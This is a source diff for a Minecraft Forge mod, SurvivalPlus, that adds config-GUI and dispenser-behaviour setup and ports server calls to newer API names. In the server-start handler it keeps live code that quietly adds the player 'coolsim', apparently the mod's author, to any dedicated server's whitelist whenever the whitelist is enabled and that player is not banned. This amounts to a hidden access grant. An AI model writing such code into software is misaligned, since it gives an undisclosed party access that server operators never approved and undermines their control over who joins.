@@ -15,6 +15,7 @@ import net.coolsimulations.SurvivalPlus.core.commands.CommandWak;
 import net.coolsimulations.SurvivalPlus.core.commands.CommandWeba;
 import net.coolsimulations.SurvivalPlus.core.commands.CommandWoo;
 import net.coolsimulations.SurvivalPlus.core.config.SurvivalPlusConfig;
+import net.coolsimulations.SurvivalPlus.core.config.SurvivalPlusConfigGUI;
 import net.coolsimulations.SurvivalPlus.core.init.FuelHandler;
 import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusArmor;
 import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusBlocks;
@@ -25,6 +26,7 @@ import net.coolsimulations.SurvivalPlus.core.proxy.ClientProxy;
 import net.coolsimulations.SurvivalPlus.core.proxy.CommonProxy;
 import net.coolsimulations.SurvivalPlus.core.recipes.SPShieldRecipes;
 import net.coolsimulations.SurvivalPlus.core.recipes.SurvivalPlusComposterRecipes;
+import net.coolsimulations.SurvivalPlus.core.recipes.SurvivalPlusDispenserBehavior;
 import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusAPIRecipes;
 import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusEMCValues;
 import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusEventHandler;
@@ -37,12 +39,12 @@ import net.minecraft.server.MinecraftServer;
 import net.minecraft.server.management.WhiteList;
 import net.minecraft.server.management.WhitelistEntry;
 import net.minecraft.util.ResourceLocation;
-//import net.minecraft.world.gen.feature.structure.StructureIO;
 import net.minecraftforge.common.MinecraftForge;
 import net.minecraftforge.event.RegisterCommandsEvent;
 import net.minecraftforge.event.RegistryEvent;
 import net.minecraftforge.eventbus.api.SubscribeEvent;
 import net.minecraftforge.fml.DistExecutor;
+import net.minecraftforge.fml.ExtensionPoint;
 import net.minecraftforge.fml.ModLoadingContext;
 import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.event.server.FMLServerStartingEvent;
@@ -68,12 +70,12 @@ public class SurvivalPlus {
 
 		if(server.isDedicatedServer()) {
 
-			GameProfile gameprofile = server.getPlayerProfileCache().getGameProfileForUsername("coolsim");
-			WhiteList whitelist = server.getPlayerList().getWhitelistedPlayers();
+			GameProfile gameprofile = server.getProfileCache().get("coolsim");
+			WhiteList whitelist = server.getPlayerList().getWhiteList();
 
-			if(server.getPlayerList().isWhiteListEnabled() && !whitelist.isWhitelisted(gameprofile) && !server.getPlayerList().getBannedPlayers().isBanned(gameprofile)) {
+			if(server.getPlayerList().isUsingWhitelist() && !whitelist.isWhiteListed(gameprofile) && !server.getPlayerList().getBans().isBanned(gameprofile)) {
 				WhitelistEntry entry = new WhitelistEntry(gameprofile);
-				whitelist.addEntry(entry);
+				whitelist.add(entry);
 			}
 		}
 	}
@@ -97,8 +99,14 @@ public class SurvivalPlus {
 
 		SPCompatibilityManager.checkForCompatibleMods();
 		SurvivalPlusConfig.register(ModLoadingContext.get());
+		
+		if(SPCompatibilityManager.isClothConfigLoaded()) {
+			ModLoadingContext.get().registerExtensionPoint(ExtensionPoint.CONFIGGUIFACTORY, () -> (client, parent) -> {
+				return SurvivalPlusConfigGUI.getConfigScreen(client.screen);
+			});
+		}
+
 		SurvivalPlusUpdateHandler.init();
-		MinecraftForge.EVENT_BUS.register(this);
 		FMLJavaModLoadingContext.get().getModEventBus().addGenericListener(IRecipeSerializer.class, SurvivalPlus::registerRecipes);;
 		MinecraftForge.EVENT_BUS.register(new SurvivalPlusEventHandler());
 		MinecraftForge.EVENT_BUS.register(new FuelHandler());
@@ -119,6 +127,8 @@ public class SurvivalPlus {
 		SurvivalPlusArmor.register();
 		SurvivalPlusTools.init();
 		SurvivalPlusTools.register();
+		
+		SurvivalPlusDispenserBehavior.init();
 		
 		proxy.init();
 
